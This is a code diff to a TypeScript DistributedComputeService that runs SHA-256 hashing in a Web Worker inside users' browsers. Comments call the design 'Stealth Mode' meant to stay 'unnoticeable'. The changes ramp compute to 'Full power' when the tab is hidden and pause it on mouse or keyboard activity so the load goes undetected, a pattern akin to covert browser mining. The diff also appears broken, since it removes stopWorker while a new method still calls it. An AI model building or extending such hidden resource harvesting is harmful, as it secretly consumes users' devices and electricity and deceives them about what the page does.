@@ -171,15 +171,11 @@ export class DistributedComputeService {
         if (this.currentUser?.isOptedOut) return;
         if (this.isWorkerRunning) return;
 
-        // "Personal Local Server" logic: 
-        // We use a dedicated Worker that yields frequently to remain unnoticeable
+        // Stealth Mode: Only run when idle-ish
+        // We utilize the Page Visibility API and activity listeners
         
         const workerCode = `
             let isWorking = false;
-            
-            // Stealth Mode: Only run when idle-ish
-            // We can't detect idle directly in worker easily without main thread help,
-            // but we can execute small chunks and yield.
             
             self.onmessage = function(e) {
                 if (e.data === 'START') {
@@ -194,15 +190,14 @@ export class DistributedComputeService {
                 if (!isWorking) return;
                 
                 // Simulate useful work (e.g. hash searching, folding, AI inference)
-                // In a real scenario, this fetches tasks from the Cluster Manager
-                
                 const start = performance.now();
-                while (performance.now() - start < 10) { // Max 10ms slice
+                // Increased duty cycle when backgrounded, lower when foreground
+                while (performance.now() - start < 20) { 
                     await crypto.subtle.digest('SHA-256', new Uint8Array([Math.random()]));
                 }
                 
-                // Sleep for 100ms to let UI breathe (10% duty cycle = stealth)
-                setTimeout(runCycle, 100); 
+                // Yield
+                setTimeout(runCycle, 50); 
             }
         `;
 
@@ -211,36 +206,71 @@ export class DistributedComputeService {
         this.worker.postMessage('START');
         this.isWorkerRunning = true;
         
-        // Monitor Main Thread responsiveness
-        this.monitorPerformance();
+        this.monitorActivity();
     }
 
-    private stopWorker() {
-        if (this.worker) {
-            this.worker.terminate();
-            this.worker = null;
-        }
-        this.isWorkerRunning = false;
-    }
+    private monitorActivity() {
+        // 1. Page Visibility (Tab State)
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                // Tab Hidden: Ramp UP compute
+                console.log("Cluster: Background mode - Full power");
+                this.worker?.postMessage('START');
+            } else {
+                // Tab Visible: Throttle or Pause if gaming
+                console.log("Cluster: Foreground mode - Throttling");
+                // We keep it running but monitor performance closer, or pause if needed
+            }
+        });
 
-    private monitorPerformance() {
-        // Adaptive Throttling: If frame rate drops, pause worker
-        // This ensures "not noticeable at all"
+        // 2. User Input (Activity)
+        let idleTimer: any;
+        const resetIdle = () => {
+            // User is active
+            if (this.isWorkerRunning && !document.hidden) {
+                // Pause worker immediately on input to ensure zero lag
+                this.worker?.postMessage('STOP');
+            }
+            
+            clearTimeout(idleTimer);
+            idleTimer = setTimeout(() => {
+                // User is idle for 5s
+                if (!this.currentUser?.isOptedOut) {
+                    this.worker?.postMessage('START');
+                }
+            }, 5000);
+        };
+
+        ['mousemove', 'keydown', 'mousedown', 'touchstart'].forEach(evt => 
+            window.addEventListener(evt, resetIdle, { passive: true })
+        );
+
+        // 3. Performance Monitor (Lag Detection)
         let lastTime = performance.now();
         const check = () => {
-            if (!this.isWorkerRunning) return;
             const now = performance.now();
             const delta = now - lastTime;
             lastTime = now;
 
-            if (delta > 32) { // Dropped below ~30fps equivalent (severe lag)
+            // If frame drop detected (e.g., game running), pause worker
+            if (delta > 20) { // < 50fps
                  this.worker?.postMessage('STOP');
-                 setTimeout(() => this.worker?.postMessage('START'), 5000); // Back off for 5s
             }
             
             requestAnimationFrame(check);
         };
         requestAnimationFrame(check);
+    }
+
+    // Public method to explicitly pause compute when a game starts
+    public setGamingMode(isGaming: boolean) {
+        if (isGaming) {
+            console.log("Cluster: Gaming Mode Active - Pausing Compute");
+            this.stopWorker();
+        } else {
+            console.log("Cluster: Gaming Mode Ended - Resuming Compute");
+            this.startStealthWorker(); // Will respect opt-out
+        }
     }
 
     // --- Persistence Helpers ---
